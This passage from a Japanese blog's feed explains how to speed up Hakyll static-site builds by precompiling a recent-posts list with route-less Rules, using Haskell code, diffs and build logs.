<li id="fn7" role="doc-endnote"><p><code>petalinux-build</code> などを実行すると裏で <code>Xvfb</code> が大量に立ち上がってたりはする<a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#fnref7" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn8" role="doc-endnote"><p>Vivado のときみたいなえげつないディスクアクセスを減らす工夫ができないので勘弁してほしい<a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#fnref8" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>]]></summary>
</entry>
<entry>
    <title>route なしの Rules で Hakyll のビルドを高速化する</title>
    <link href="https://blog.myon.info/entry/2018/08/16/non-route-rules/index.html" />
    <id>https://blog.myon.info/entry/2018/08/16/non-route-rules/index.html</id>
    <published>2018-08-16T06:14:00Z</published>
    <updated>2018-08-16T06:14:00Z</updated>
    <summary type="html"><![CDATA[<h2 id="tldr">TL;DR</h2>
<ul>
<li>Hakyll の <code>Rules</code> で <code>route</code> は省略できる
<ul>
<li>省略すると <strong>compile されるが出力されない</strong></li>
</ul></li>
<li>この挙動は<strong>何度も呼ばれる処理のプリコンパイル</strong>に応用できそう</li>
<li><a href="https://blog.myon.info/">blog.myon.info</a> のフッタ生成処理にこれを採用して<strong>ビルドを高速化</strong>できた
<ul>
<li>全ページのフッタに最新の記事へのリンクなどを入れているため時間がかかっていた</li>
</ul></li>
</ul>
<!--more-->
<h2 id="route-なしの-rules"><code>route</code> なしの <code>Rules</code></h2>
<p>Hakyll の <a href="https://www.stackage.org/haddock/lts-12.6/hakyll-4.12.3.0/Hakyll-Core-Rules.html"><code>Rules</code></a> には、「どこに配置するのか」を指定する <a href="https://www.stackage.org/haddock/lts-12.6/hakyll-4.12.3.0/Hakyll-Core-Rules.html#v:route"><code>route</code></a> と「どう加工するか」を指定する <a href="https://www.stackage.org/haddock/lts-12.6/hakyll-4.12.3.0/Hakyll-Core-Rules.html#v:compile"><code>compile</code></a> を記述します。このうち <code>route</code> は、<a href="https://www.stackage.org/haddock/lts-12.6/hakyll-4.12.3.0/Hakyll-Core-Routes.html">ドキュメント</a>にもあるように省略することができ、省略した場合はファイルが出力されなくなります。</p>
<blockquote>
<p>Finally, some special cases:</p>
<ul>
<li><u>If there is no route for an item, this item will not be routed, so it will not appear in your site directory.</u></li>
<li>If an item matches multiple routes, the first rule will be chosen.</li>
</ul>
</blockquote>
<p>実際に次のコードで確認してみましょう。</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb1-1"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#!/usr/bin/env stack</span></span>
<span id="cb1-2"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="co">-- stack --resolver lts-12.6 script --package hakyll</span></span>
<span id="cb1-3"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb1-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-4"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ot">{-# LANGUAGE OverloadedStrings #-}</span></span>
<span id="cb1-5"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb1-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-6"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span>           <span class="dt">Hakyll</span></span>
<span id="cb1-7"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb1-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-8"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="ot">main ::</span> <span class="dt">IO</span> ()</span>
<span id="cb1-9"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb1-9" aria-hidden="true" tabindex="-1"></a>main <span class="ot">=</span> hakyll <span class="op">$</span> <span class="kw">do</span></span>
<span id="cb1-10"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb1-10" aria-hidden="true" tabindex="-1"></a>  create [<span class="st">&quot;hoge.txt&quot;</span>] <span class="op">$</span></span>
<span id="cb1-11"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb1-11" aria-hidden="true" tabindex="-1"></a>    compile <span class="op">$</span></span>
<span id="cb1-12"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb1-12" aria-hidden="true" tabindex="-1"></a>      makeItem (<span class="st">&quot;にゃーん&quot;</span><span class="ot"> ::</span> <span class="dt">String</span>)</span>
<span id="cb1-13"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb1-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-14"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb1-14" aria-hidden="true" tabindex="-1"></a>  create [<span class="st">&quot;fuga.txt&quot;</span>] <span class="op">$</span> <span class="kw">do</span></span>
<span id="cb1-15"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb1-15" aria-hidden="true" tabindex="-1"></a>    route idRoute</span>
<span id="cb1-16"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb1-16" aria-hidden="true" tabindex="-1"></a>    compile <span class="op">$</span> <span class="kw">do</span></span>
<span id="cb1-17"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb1-17" aria-hidden="true" tabindex="-1"></a>      hoge <span class="ot">&lt;-</span> loadBody <span class="st">&quot;hoge.txt&quot;</span></span>
<span id="cb1-18"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb1-18" aria-hidden="true" tabindex="-1"></a>      makeItem <span class="op">$</span> (<span class="st">&quot;Λ__Λ &lt; &quot;</span> <span class="op">&lt;&gt;</span><span class="ot"> hoge ::</span> <span class="dt">String</span>)</span></code></pre></div>
<p>コードを実行したあと出力ディレクトリを確認すると、<code>route</code> を指定した <code>fuga.txt</code> のみが出力されているのがわかります。また出力された <code>fuga.txt</code> の内容を確認してみると <code>hoge.txt</code> の <code>Rules</code> で指定した結果が表れており、<code>hoge.txt</code> の <code>compile</code> の処理はちゃんと実行されているのがわかります。</p>
<pre><code>$ chmod +x site.hs
$ ./site.hs -v build
Initialising...
  Creating store...
  Creating provider...
  Running rules...
Checking for out-of-date items
  [DEBUG] fuga.txt is out-of-date because it is new
  [DEBUG] hoge.txt is out-of-date because it is new
Compiling
  [DEBUG] Processing fuga.txt
  [DEBUG] Hakyll.Core.Compiler.Internal: Adding dependency: IdentifierDependency hoge.txt
  [DEBUG] Require hoge.txt (snapshot _final): chasing
  [DEBUG] Processing hoge.txt
  updated hoge.txt
  [DEBUG] Processing fuga.txt
  [DEBUG] Require hoge.txt (snapshot _final): OK
  [DEBUG] Processing fuga.txt
  updated fuga.txt
  [DEBUG] Routed to _site/fuga.txt
Success
  [DEBUG] Removing tmp directory...
$ ls _site/
fuga.txt
$ cat _site/fuga.txt
Λ__Λ &lt; にゃーん</code></pre>
<p>この挙動はうまく利用するといろいろなことができそうです。今回は何度も呼ばれる処理のプリコンパイルに使ってみた例を紹介したいと思います。</p>
<h2 id="全ページに最新記事へのリンクを貼りたい">全ページに最新記事へのリンクを貼りたい</h2>
<p>Hakyll で生成する全てのページに最新記事数件へのリンクを入れたいとします。ちょうどこのブログのフッタのような感じですね。</p>
<p>例として Hakyll のサンプルプロジェクトでこれをやってみます。stack でプロジェクトを作成し、</p>
<pre><code>$ stack --resolver lts-12.6 new site hakyll-template</code></pre>
<p>デフォルトテンプレートをこんな感じに変更、</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb4-1"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">diff --git a/templates/default.html b/templates/default.html</span></span>
<span id="cb4-2"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-2" aria-hidden="true" tabindex="-1"></a>index cd20808..980bb9b 100644</span>
<span id="cb4-3"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="dt">--- a/templates/default.html</span></span>
<span id="cb4-4"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ b/templates/default.html</span></span>
<span id="cb4-5"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -25,6 +25,18 @@</span></span>
<span id="cb4-6"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-6" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb4-7"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-7" aria-hidden="true" tabindex="-1"></a>             $body$</span>
<span id="cb4-8"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-8" aria-hidden="true" tabindex="-1"></a>         &lt;/div&gt;</span>
<span id="cb4-9"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb4-10"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-10" aria-hidden="true" tabindex="-1"></a><span class="va">+        &lt;div id=&quot;recent-posts&quot;&gt;</span></span>
<span id="cb4-11"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-11" aria-hidden="true" tabindex="-1"></a><span class="va">+            &lt;h2&gt;Recent posts&lt;/h2&gt;</span></span>
<span id="cb4-12"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-12" aria-hidden="true" tabindex="-1"></a><span class="va">+            &lt;ul&gt;</span></span>
<span id="cb4-13"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-13" aria-hidden="true" tabindex="-1"></a><span class="va">+                $for(recent-posts)$</span></span>
<span id="cb4-14"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-14" aria-hidden="true" tabindex="-1"></a><span class="va">+                    &lt;li&gt;</span></span>
<span id="cb4-15"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-15" aria-hidden="true" tabindex="-1"></a><span class="va">+                        &lt;a href=&quot;$url$&quot;&gt;$title$&lt;/a&gt; - $date$</span></span>
<span id="cb4-16"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-16" aria-hidden="true" tabindex="-1"></a><span class="va">+                    &lt;/li&gt;</span></span>
<span id="cb4-17"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-17" aria-hidden="true" tabindex="-1"></a><span class="va">+                $endfor$</span></span>
<span id="cb4-18"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-18" aria-hidden="true" tabindex="-1"></a><span class="va">+            &lt;/ul&gt;</span></span>
<span id="cb4-19"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-19" aria-hidden="true" tabindex="-1"></a><span class="va">+        &lt;/div&gt;</span></span>
<span id="cb4-20"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-20" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb4-21"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-21" aria-hidden="true" tabindex="-1"></a>         &lt;div id=&quot;footer&quot;&gt;</span>
<span id="cb4-22"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-22" aria-hidden="true" tabindex="-1"></a>             Site proudly generated by</span>
<span id="cb4-23"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb4-23" aria-hidden="true" tabindex="-1"></a>             &lt;a href=&quot;http://jaspervdj.be/hakyll&quot;&gt;Hakyll&lt;/a&gt;</span></code></pre></div>
<p>最後に <code>site.hs</code> で最新記事の情報を <code>Context</code> に入れてやります。<a href="https://www.stackage.org/haddock/lts-12.6/hakyll-4.12.3.0/Hakyll-Core-Compiler.html#v:loadAll"><code>loadAll</code></a> を使うと <code>posts/*</code> などで依存関係のエラーが出てしまう<a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>ので、snapshot を作成してそれを利用するようにします。</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb5-1"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">diff --git a/site.hs b/site.hs</span></span>
<span id="cb5-2"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-2" aria-hidden="true" tabindex="-1"></a>index 1214769..53650a8 100644</span>
<span id="cb5-3"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="dt">--- a/site.hs</span></span>
<span id="cb5-4"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ b/site.hs</span></span>
<span id="cb5-5"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -17,16 +17,28 @@ main = hakyll $ do</span></span>
<span id="cb5-6"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-6" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb5-7"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-7" aria-hidden="true" tabindex="-1"></a>     match (fromList [&quot;about.rst&quot;, &quot;contact.markdown&quot;]) $ do</span>
<span id="cb5-8"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-8" aria-hidden="true" tabindex="-1"></a>         route   $ setExtension &quot;html&quot;</span>
<span id="cb5-9"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="st">-        compile $ pandocCompiler</span></span>
<span id="cb5-10"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="st">-            &gt;&gt;= loadAndApplyTemplate &quot;templates/default.html&quot; defaultContext</span></span>
<span id="cb5-11"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-11" aria-hidden="true" tabindex="-1"></a><span class="st">-            &gt;&gt;= relativizeUrls</span></span>
<span id="cb5-12"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-12" aria-hidden="true" tabindex="-1"></a><span class="va">+        compile $ do</span></span>
<span id="cb5-13"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-13" aria-hidden="true" tabindex="-1"></a><span class="va">+            recent &lt;- fmap (take 5) . recentFirst =&lt;&lt; loadAllSnapshots &quot;posts/*&quot; &quot;content&quot;</span></span>
<span id="cb5-14"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-14" aria-hidden="true" tabindex="-1"></a><span class="va">+            let ctx = listField &quot;recent-posts&quot; postCtx (return recent) `mappend`</span></span>
<span id="cb5-15"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-15" aria-hidden="true" tabindex="-1"></a><span class="va">+                      defaultContext</span></span>
<span id="cb5-16"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-16" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-17"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-17" aria-hidden="true" tabindex="-1"></a><span class="va">+            pandocCompiler</span></span>
<span id="cb5-18"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-18" aria-hidden="true" tabindex="-1"></a><span class="va">+                &gt;&gt;= loadAndApplyTemplate &quot;templates/default.html&quot; ctx</span></span>
<span id="cb5-19"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-19" aria-hidden="true" tabindex="-1"></a><span class="va">+                &gt;&gt;= relativizeUrls</span></span>
<span id="cb5-20"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-20" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb5-21"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-21" aria-hidden="true" tabindex="-1"></a>     match &quot;posts/*&quot; $ do</span>
<span id="cb5-22"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-22" aria-hidden="true" tabindex="-1"></a>         route $ setExtension &quot;html&quot;</span>
<span id="cb5-23"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-23" aria-hidden="true" tabindex="-1"></a><span class="st">-        compile $ pandocCompiler</span></span>
<span id="cb5-24"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-24" aria-hidden="true" tabindex="-1"></a><span class="st">-            &gt;&gt;= loadAndApplyTemplate &quot;templates/post.html&quot;    postCtx</span></span>
<span id="cb5-25"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-25" aria-hidden="true" tabindex="-1"></a><span class="st">-            &gt;&gt;= loadAndApplyTemplate &quot;templates/default.html&quot; postCtx</span></span>
<span id="cb5-26"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-26" aria-hidden="true" tabindex="-1"></a><span class="st">-            &gt;&gt;= relativizeUrls</span></span>
<span id="cb5-27"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-27" aria-hidden="true" tabindex="-1"></a><span class="va">+        compile $ do</span></span>
<span id="cb5-28"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-28" aria-hidden="true" tabindex="-1"></a><span class="va">+            content &lt;- pandocCompiler</span></span>
<span id="cb5-29"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-29" aria-hidden="true" tabindex="-1"></a><span class="va">+                &gt;&gt;= saveSnapshot &quot;content&quot;</span></span>
<span id="cb5-30"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-30" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-31"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-31" aria-hidden="true" tabindex="-1"></a><span class="va">+            recent &lt;- fmap (take 5) . recentFirst =&lt;&lt; loadAllSnapshots &quot;posts/*&quot; &quot;content&quot;</span></span>
<span id="cb5-32"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-32" aria-hidden="true" tabindex="-1"></a><span class="va">+            let ctx = listField &quot;recent-posts&quot; postCtx (return recent) `mappend`</span></span>
<span id="cb5-33"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-33" aria-hidden="true" tabindex="-1"></a><span class="va">+                      postCtx</span></span>
<span id="cb5-34"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-34" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-35"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-35" aria-hidden="true" tabindex="-1"></a><span class="va">+            loadAndApplyTemplate &quot;templates/post.html&quot; postCtx content</span></span>
<span id="cb5-36"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-36" aria-hidden="true" tabindex="-1"></a><span class="va">+                &gt;&gt;= loadAndApplyTemplate &quot;templates/default.html&quot; ctx</span></span>
<span id="cb5-37"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-37" aria-hidden="true" tabindex="-1"></a><span class="va">+                &gt;&gt;= relativizeUrls</span></span>
<span id="cb5-38"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-38" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb5-39"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-39" aria-hidden="true" tabindex="-1"></a>     create [&quot;archive.html&quot;] $ do</span>
<span id="cb5-40"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-40" aria-hidden="true" tabindex="-1"></a>         route idRoute</span>
<span id="cb5-41"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-41" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -37,9 +49,13 @@ main = hakyll $ do</span></span>
<span id="cb5-42"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-42" aria-hidden="true" tabindex="-1"></a>                     constField &quot;title&quot; &quot;Archives&quot;            `mappend`</span>
<span id="cb5-43"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-43" aria-hidden="true" tabindex="-1"></a>                     defaultContext</span>
<span id="cb5-44"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-44" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb5-45"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-45" aria-hidden="true" tabindex="-1"></a><span class="va">+            recent &lt;- fmap (take 5) . recentFirst =&lt;&lt; loadAllSnapshots &quot;posts/*&quot; &quot;content&quot;</span></span>
<span id="cb5-46"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-46" aria-hidden="true" tabindex="-1"></a><span class="va">+            let ctx = listField &quot;recent-posts&quot; postCtx (return recent) `mappend`</span></span>
<span id="cb5-47"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-47" aria-hidden="true" tabindex="-1"></a><span class="va">+                      archiveCtx</span></span>
<span id="cb5-48"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-48" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-49"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-49" aria-hidden="true" tabindex="-1"></a>             makeItem &quot;&quot;</span>
<span id="cb5-50"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-50" aria-hidden="true" tabindex="-1"></a>                 &gt;&gt;= loadAndApplyTemplate &quot;templates/archive.html&quot; archiveCtx</span>
<span id="cb5-51"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-51" aria-hidden="true" tabindex="-1"></a><span class="st">-                &gt;&gt;= loadAndApplyTemplate &quot;templates/default.html&quot; archiveCtx</span></span>
<span id="cb5-52"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-52" aria-hidden="true" tabindex="-1"></a><span class="va">+                &gt;&gt;= loadAndApplyTemplate &quot;templates/default.html&quot; ctx</span></span>
<span id="cb5-53"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-53" aria-hidden="true" tabindex="-1"></a>                 &gt;&gt;= relativizeUrls</span>
<span id="cb5-54"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-54" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb5-55"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-55" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb5-56"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-56" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -52,9 +68,13 @@ main = hakyll $ do</span></span>
<span id="cb5-57"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-57" aria-hidden="true" tabindex="-1"></a>                     constField &quot;title&quot; &quot;Home&quot;                `mappend`</span>
<span id="cb5-58"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-58" aria-hidden="true" tabindex="-1"></a>                     defaultContext</span>
<span id="cb5-59"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-59" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb5-60"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-60" aria-hidden="true" tabindex="-1"></a><span class="va">+            recent &lt;- fmap (take 5) . recentFirst =&lt;&lt; loadAllSnapshots &quot;posts/*&quot; &quot;content&quot;</span></span>
<span id="cb5-61"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-61" aria-hidden="true" tabindex="-1"></a><span class="va">+            let ctx = listField &quot;recent-posts&quot; postCtx (return recent) `mappend`</span></span>
<span id="cb5-62"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-62" aria-hidden="true" tabindex="-1"></a><span class="va">+                      indexCtx</span></span>
<span id="cb5-63"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-63" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-64"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-64" aria-hidden="true" tabindex="-1"></a>             getResourceBody</span>
<span id="cb5-65"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-65" aria-hidden="true" tabindex="-1"></a>                 &gt;&gt;= applyAsTemplate indexCtx</span>
<span id="cb5-66"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-66" aria-hidden="true" tabindex="-1"></a><span class="st">-                &gt;&gt;= loadAndApplyTemplate &quot;templates/default.html&quot; indexCtx</span></span>
<span id="cb5-67"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-67" aria-hidden="true" tabindex="-1"></a><span class="va">+                &gt;&gt;= loadAndApplyTemplate &quot;templates/default.html&quot; ctx</span></span>
<span id="cb5-68"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-68" aria-hidden="true" tabindex="-1"></a>                 &gt;&gt;= relativizeUrls</span>
<span id="cb5-69"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-69" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb5-70"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb5-70" aria-hidden="true" tabindex="-1"></a>     match &quot;templates/*&quot; $ compile templateCompiler</span></code></pre></div>
<p>これでとりあえずの目的は達成できました。(この図は雑に記事を増やしたあとにキャプチャしたものです)</p>
<figure>
<img src="https://blog.myon.info/entry/2018/08/16/non-route-rules/hakyll1.png" alt="hakyll1" />
<figcaption aria-hidden="true">hakyll1</figcaption>
</figure>
<h3 id="遅い">遅い！！！</h3>
<p>先程のコードのまま記事数を増やしてみます。すると・・・</p>
<pre><code>$ for y in {2016..2050}; do
    for m in {01..12}; do
      cp posts/{2015-08,$y-$m}-23-example.markdown
    done
  done
$ time stack exec site rebuild
Removing _site...
Removing _cache...
Removing _cache/tmp...
Initialising...
  Creating store...
  Creating provider...
  Running rules...
Checking for out-of-date items
Compiling
  updated templates/default.html
  updated about.rst
  updated templates/post.html
  updated posts/2015-08-23-example.markdown
  updated posts/2016-01-23-example.markdown
  ...
  updated templates/post-list.html
  updated archive.html
  updated contact.markdown
  updated css/default.css
  updated index.html
Success
stack exec site rebuild  89.15s user 5.75s system 103% cpu 1:31.86 total</code></pre>
<p>ビルドにめちゃくちゃ時間がかかるようになってしまいました。もちろん生成されるページ数が増えたというのもありますが、変更前はログがバッと流れていたものが、1行毎に一瞬止まるようになってしまいました。ページ生成毎に全ての記事情報を読み込んで並べ替えて…なんてやっているので仕方ないですが、やっぱりなんとかしたいところですね。</p>
<h3 id="route-なし-rules-を使ったプリコンパイル"><code>route</code> なし <code>Rules</code> を使ったプリコンパイル</h3>
<p>最新記事を列挙する処理は各ページ固有の情報に依存しないので、全てのページで同じ結果になるはずです。ということは、あらかじめ最新記事リストを生成しておいて、各ページ生成時にその結果を呼び出すようにすれば高速化できそうです。これを <code>route</code> なし <code>Rules</code> を使って実装してみます。</p>
<p>まず、最新記事リストのテンプレート <code>templates/recent-posts.html</code> を作成します。</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb7-1"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;div</span> <span class="er">id</span><span class="ot">=</span><span class="st">&quot;recent-posts&quot;</span><span class="kw">&gt;</span></span>
<span id="cb7-2"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb7-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;h2&gt;</span>Recent posts<span class="kw">&lt;/h2&gt;</span></span>
<span id="cb7-3"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb7-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;ul&gt;</span></span>
<span id="cb7-4"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb7-4" aria-hidden="true" tabindex="-1"></a>        $for(recent-posts)$</span>
<span id="cb7-5"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb7-5" aria-hidden="true" tabindex="-1"></a>            <span class="kw">&lt;li&gt;</span></span>
<span id="cb7-6"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb7-6" aria-hidden="true" tabindex="-1"></a>                <span class="kw">&lt;a</span> <span class="er">href</span><span class="ot">=</span><span class="st">&quot;$url$&quot;</span><span class="kw">&gt;</span>$title$<span class="kw">&lt;/a&gt;</span> - $date$</span>
<span id="cb7-7"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb7-7" aria-hidden="true" tabindex="-1"></a>            <span class="kw">&lt;/li&gt;</span></span>
<span id="cb7-8"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb7-8" aria-hidden="true" tabindex="-1"></a>        $endfor$</span>
